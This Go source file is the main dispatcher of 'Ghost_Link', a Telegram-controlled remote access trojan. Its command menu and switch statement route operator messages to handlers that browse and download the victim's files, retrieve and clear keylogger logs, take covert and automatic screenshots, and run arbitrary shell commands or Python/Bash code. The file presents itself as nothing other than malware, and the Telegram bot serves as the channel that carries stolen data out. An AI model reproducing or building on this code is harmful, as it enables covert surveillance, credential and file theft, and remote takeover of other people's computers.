package main

import (
	"log"
	"strings"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"ghost_link/utilities"
)

const botToken = "LOL" // Replace with your bot token

func main() {
	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		log.Fatalf("Failed to create bot: %v", err)
	}

	bot.Debug = false
	log.Printf("Authorized on account %s", bot.Self.UserName)

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message == nil {
			continue
		}

		chatID := update.Message.Chat.ID
		text := update.Message.Text

		switch {
		case text == "/start":
			message := "Welcome to Ghost_Link! Here's what I can do:\n" +
				"- Remote file access commands:\n" +
				"  /ls - List files and folders\n" +
				"  /cd <folder> - Move to a folder\n" +
				"  /cdx - Move back to the previous folder\n" +
				"  /get <file/folder> - Download a file or folder\n" +
				"- Keylogger commands:\n" +
				"  /get_log - Retrieve the log file\n" +
				"  /clear_log - Clear the log file\n" +
				"- Screenshot commands:\n" +
				"  /screenshot - Capture a screenshot\n" +
				"  /screenshot_frequency <seconds> - Set auto-screenshot frequency\n" +
				"  /auto_screenshot - Start auto-screenshot\n" +
				"  /stop_screenshot - Stop auto-screenshot\n" +
				"- Remote code execution commands:\n" +
				"  /run <command> - Execute a shell command\n" +
				"  /code <language> <code> - Execute code (Python/Bash)."
			bot.Send(tgbotapi.NewMessage(chatID, message))

		case strings.HasPrefix(text, "/ls"):
			utilities.HandleListCommand(bot, chatID)

		case strings.HasPrefix(text, "/cdx"):
			utilities.HandleMoveBackCommand(bot, chatID)

		case strings.HasPrefix(text, "/cd "):
			folder := strings.TrimSpace(strings.TrimPrefix(text, "/cd "))
			utilities.HandleMoveToFolderCommand(bot, chatID, folder)

		case strings.HasPrefix(text, "/get "):
			name := strings.TrimSpace(strings.TrimPrefix(text, "/get "))
			utilities.HandleGetCommand(bot, chatID, name)

		case text == "/stop":
			bot.Send(tgbotapi.NewMessage(chatID, "Transmission stopped."))
			return

		case text == "/get_log":
			utilities.HandleGetLog(bot, chatID)

		case text == "/clear_log":
			utilities.HandleClearLog(bot, chatID)

		case text == "/screenshot":
			utilities.HandleScreenshot(bot, chatID)

		case strings.HasPrefix(text, "/screenshot_frequency"):
			freq := strings.TrimSpace(strings.TrimPrefix(text, "/screenshot_frequency "))
			utilities.SetScreenshotFrequency(bot, chatID, freq)

		case text == "/auto_screenshot":
			utilities.StartAutoScreenshot(bot, chatID)

		case text == "/stop_screenshot":
			utilities.StopAutoScreenshot(bot, chatID)

		case strings.HasPrefix(text, "/run "):
			command := strings.TrimSpace(strings.TrimPrefix(text, "/run "))
			utilities.ExecuteShellCommand(bot, chatID, command)

		case strings.HasPrefix(text, "/code "):
			args := strings.TrimSpace(strings.TrimPrefix(text, "/code "))
			parts := strings.SplitN(args, " ", 2)
			if len(parts) < 2 {
				bot.Send(tgbotapi.NewMessage(chatID, "Invalid format. Use: /code <language> <code>"))
				break
			}
			language := parts[0]
			code := parts[1]
			utilities.ExecuteCode(bot, chatID, language, code)

		default:
			bot.Send(tgbotapi.NewMessage(chatID, "Invalid command."))
		}
	}
}
